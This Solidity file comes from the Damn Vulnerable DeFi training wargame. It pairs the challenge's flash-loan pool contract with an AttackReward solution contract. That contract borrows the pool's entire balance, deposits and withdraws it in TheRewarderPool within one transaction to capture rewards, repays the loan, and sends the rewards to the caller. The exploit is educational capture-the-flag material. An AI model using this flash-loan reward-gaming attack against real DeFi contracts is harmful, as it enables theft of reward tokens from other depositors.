// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(
            msg.sender.isContract(),
            "Borrower must be a deployed contract"
        );

        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature("receiveFlashLoan(uint256)", amount)
        );

        require(
            liquidityToken.balanceOf(address(this)) >= balanceBefore,
            "Flash loan not paid back"
        );
    }
}

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";
import "./TheRewarderPool.sol";

contract AttackReward {
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    RewardToken public reward;

    constructor(
        address _pool,
        address _token,
        address _rewardPool,
        address _reward
    ) {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        reward = RewardToken(_reward);
    }

    fallback() external {
        uint256 balance = token.balanceOf(address(this));
        token.approve(address(rewardPool), balance);
        rewardPool.deposit(balance);
        rewardPool.withdraw(balance);
        token.transfer(address(pool), balance);
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }
}
